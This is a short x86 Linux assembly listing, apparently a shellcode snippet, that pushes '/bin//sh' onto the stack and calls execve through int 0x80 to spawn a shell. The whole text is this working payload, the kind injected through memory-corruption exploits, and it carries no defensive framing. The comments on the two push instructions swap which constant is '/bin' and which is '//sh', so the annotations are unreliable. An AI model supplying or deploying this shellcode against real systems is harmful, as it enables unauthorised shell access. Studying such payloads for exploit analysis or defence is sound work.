xor    eax,eax		;eax = 0
push   eax			;push 0
push   0x68732f2f	;push "/bin"
push   0x6e69622f	;push "//sh"
mov    ebx,esp		;ebx = "/bin//sh"
xor    ecx,ecx		;ecx = 0
mov    edx,ecx		;edx = 0
push   0xb			;push 11
pop    eax			;eax = 11
int    0x80			;syscall

;eax = 11;
;ebx = "/bin/sh"
;ecx = 0
;edx = 0
;int 0x80
